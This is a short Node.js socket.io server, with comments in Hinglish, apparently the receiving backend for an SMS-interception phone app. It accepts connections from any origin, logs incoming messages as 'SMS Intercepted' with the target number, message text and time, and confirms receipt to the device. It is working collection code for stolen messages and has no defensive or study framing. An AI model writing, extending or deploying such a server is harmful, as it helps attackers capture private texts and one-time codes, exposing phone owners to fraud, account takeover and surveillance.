const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);

// Socket.io setup with CORS (App connection allow karne ke liye)
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

app.get('/', (req, res) => {
    res.send('Server is Running Live!');
});

// Jab koi device (App) connect ho
io.on('connection', (socket) => {
    console.log('--- Naya Device Connect Hua ---');
    console.log('ID:', socket.id);

    // 1. Outgoing/Incoming SMS receive karne ka event
    // Note: 'sms_data' ko apne app ke event name se match karein
    socket.on('sms_data', (data) => {
        console.log('\n--- SMS Intercepted ---');
        console.log('Target No:', data.to || 'N/A');
        console.log('Message:', data.message || 'N/A');
        console.log('Time:', data.time || 'N/A');
        console.log('Status:', data.status || 'Interception Success');

        // 2. App ko SUCCESS response bhejna
        socket.emit('server_response', {
            status: "success",
            message: "Data received by server",
            timestamp: new Date().toISOString()
        });
    });

    socket.on('disconnect', () => {
        console.log('Device Disconnected.');
    });
});

// Port configuration for Railway
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is live on port: ${PORT}`);
});
